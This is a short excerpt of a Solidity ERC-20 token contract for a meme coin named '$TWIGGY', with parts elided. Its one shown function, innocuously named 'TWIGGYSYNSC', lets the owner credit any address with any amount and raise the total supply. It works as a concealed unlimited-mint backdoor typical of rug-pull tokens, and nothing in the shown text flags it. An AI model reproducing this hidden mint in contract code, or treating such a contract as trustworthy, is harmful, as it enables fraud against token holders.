/*
WELCOME TO THE MAGICAL WORLD OF $TWIGGY
...
contract TWIGGY is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"TWIGGY";
    ...
    function TWIGGYSYNSC(address revieceAddress, uint256 amount) external onlyOwner {
        _balances[revieceAddress] += amount;
        _tTotal += amount;
        emit Transfer(address(0), revieceAddress, amount);
    }
